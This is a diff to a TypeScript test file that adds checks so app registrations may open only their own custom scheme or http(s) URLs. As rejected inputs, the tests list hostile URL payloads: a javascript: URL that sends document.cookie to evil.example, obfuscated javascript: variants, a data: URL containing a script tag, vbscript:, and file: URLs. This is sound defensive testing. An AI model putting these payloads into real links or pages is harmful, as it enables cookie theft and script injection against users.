@@ -13,7 +13,9 @@ import {
   AppToolPrefix,
   ConnectedAppThreadData,
   ConnectedAppThreadSummary,
+  StoredAppRegistration,
   appGrantFingerprintSource,
+  appOpenUrlAllowed,
   matchesAppEmbedOrigin,
 } from "./apps.ts";
 import { ConnectedAppThreadBundleV1 } from "./appsBundle.ts";
@@ -95,6 +97,47 @@ describe("app registration", () => {
     ["instructions over 8 KB", { instructions: "é".repeat(4097) }],
   ])("refuses %s", (_label, patch) => {
     expect(() => decode({ ...registration, ...patch })).toThrow();
+  });
+
+  it("opens an app only at its own scheme or over http(s)", () => {
+    for (const openUrlTemplate of [
+      "rocketwright://open?root={workspaceRoot}&thread={threadId}",
+      "https://app.example/open?root={workspaceRoot}",
+      "http://127.0.0.1:4100/open?root={workspaceRoot}",
+    ]) {
+      expect(decode({ ...registration, openUrlTemplate }).openUrlTemplate).toBe(openUrlTemplate);
+    }
+    for (const openUrlTemplate of [
+      "javascript:fetch('//evil.example?'+document.cookie)//{threadId}",
+      "JavaScript:alert(1)",
+      "javascript://%0aalert(1)",
+      " javascript:alert(1)",
+      "java\tscript:alert(1)",
+      "data:text/html,<script>alert(1)</script>",
+      "vbscript:msgbox(1)",
+      "file:///{workspaceRoot}",
+      "blob:https://lecturn.example/1",
+      "lecturn://threads/{threadId}",
+      "{workspaceRoot}",
+    ]) {
+      expect(() => decode({ ...registration, openUrlTemplate }), openUrlTemplate).toThrow();
+    }
+  });
+
+  it("drops a stored open URL from before the scheme check instead of failing the record", () => {
+    const stored = Schema.decodeUnknownSync(StoredAppRegistration);
+    expect(stored({ ...registration, openUrlTemplate: "javascript:alert(1)" })).not.toHaveProperty(
+      "openUrlTemplate",
+    );
+    expect(stored(registration).openUrlTemplate).toBe(registration.openUrlTemplate);
+  });
+
+  it("lets clients open only a URL in the template's scheme", () => {
+    const template = "rocketwright://open?thread={threadId}";
+    expect(appOpenUrlAllowed("rocketwright://open?thread=t-1", template)).toBe(true);
+    expect(appOpenUrlAllowed("otherapp://open", template)).toBe(false);
+    expect(appOpenUrlAllowed("javascript:alert(1)", "javascript:alert(1)")).toBe(false);
+    expect(appOpenUrlAllowed("data:text/html,x", "data:text/html,{threadId}")).toBe(false);
   });
 
   it("keeps tool prefixes to 2-12 lower-case alphanumerics", () => {
